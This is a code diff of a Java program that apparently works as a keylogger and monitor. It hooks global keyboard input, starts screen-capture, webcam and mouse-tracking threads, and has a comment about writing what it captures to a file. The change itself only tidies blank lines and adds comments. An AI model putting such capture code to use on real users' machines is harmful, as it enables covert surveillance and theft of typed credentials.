@@ -26,7 +26,6 @@ public class Main implements NativeKeyListener {
 
     public static void main(String args[]) throws IOException {
         // first. register globalscreem class to take event
-
         try {
             GlobalScreen.registerNativeHook(); // GlobalScreen is class global screen use your screen of jhook API java
         } catch (NativeHookException e) {
@@ -56,15 +55,10 @@ public class Main implements NativeKeyListener {
         Thread tMouse = new Thread(mouse);
         // run two thread. (????)
         
-        
-        tScreen.start();
-        tCam.start();
-        
-        
-        tMouse.start();
-
+        tScreen.start(); // start thread screen capture
+        tCam.start(); // start thread webcam
+        tMouse.start(); // start thread mouse event
     }
-
     // đọc ghi vào file nhưng gì đã bắt
     @Override
     public void nativeKeyPressed(NativeKeyEvent e) {
